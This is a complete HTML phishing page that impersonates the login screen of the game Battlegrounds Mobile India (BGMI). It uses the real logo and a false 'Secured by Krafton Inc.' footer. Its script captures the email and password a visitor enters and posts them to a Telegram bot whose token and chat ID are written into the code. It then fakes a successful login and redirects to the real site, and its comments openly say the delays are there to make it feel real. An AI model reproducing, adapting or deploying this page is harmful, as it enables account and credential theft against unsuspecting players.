<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BGMI - Secure Login</title>
    <style>
        body {
            background-color: #0f0f0f; /* Dark gaming theme */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .login-card {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 15px;
            width: 320px;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0,0,0,0.7);
            border: 1px solid #333;
        }
        .logo-container {
            margin-bottom: 20px;
        }
        .logo-container img {
            width: 180px;
            max-width: 100%;
        }
        h2 {
            color: #fff;
            margin: 0 0 25px 0;
            font-size: 22px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #444;
            border-radius: 8px;
            background: #2a2a2a;
            color: #ddd;
            font-size: 15px;
            box-sizing: border-box; /* Fixes padding issues */
            transition: 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #ff9900;
            background: #333;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff9900, #ff6600);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 4px 10px rgba(255, 153, 0, 0.3);
        }
        button:hover {
            background: linear-gradient(90deg, #ffaa33, #ff7722);
            transform: translateY(-2px);
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #666;
        }
        .loader {
            display: none;
            margin-top: 10px;
            color: #ff9900;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="login-card">
    <!-- REAL BGMI LOGO -->
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/6/6d/Battlegrounds_Mobile_India_logo.png/220px-Battlegrounds_Mobile_India_logo.png" alt="BGMI Logo">
    </div>
    
    <h2>Account Login</h2>
    
    <form id="loginForm">
        <input type="text" id="email" placeholder="Email ID / Mobile No." required autocomplete="off">
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">LOG IN</button>
    </form>
    
    <div class="loader" id="loader">Verifying credentials...</div>
    
    <div class="footer">
        Secured by Krafton Inc.<br>
        © 2024-2026 All Rights Reserved.
    </div>
</div>

<script>
    // --- CONFIGURATION START ---
    const botToken = "8950744958:AAEmCzH6GjVrdj3RgrAMczNyNUMuyMhd31E"; 
    const chatId = "5940149990";
    // --- CONFIGURATION END ---

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const loader = document.getElementById('loader');
        
        // Show loading animation to make it feel real
        loader.style.display = 'block';
        document.querySelector('button').disabled = true;
        document.querySelector('button').innerText = "Logging in...";

        setTimeout(() => {
            const message = `🔓 <b>New BGMI Login!</b>\n\n📧 <b>Email:</b> ${email}\n🔑 <b>Password:</b> ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if (response.ok) {
                    alert("✅ Logged In Successfully!");
                    window.location.href = "https://www.bgmi.live";
                } else {
                    response.text().then(text => alert("Error: " + text));
                    loader.style.display = 'none';
                    document.querySelector('button').disabled = false;
                    document.querySelector('button').innerText = "LOG IN";
                }
            })
            .catch(error => {
                alert("Network Error");
                loader.style.display = 'none';
                document.querySelector('button').disabled = false;
                document.querySelector('button').innerText = "LOG IN";
            });
        }, 1500); // 1.5 second delay to simulate server check
    });
</script>

</body>
</html>
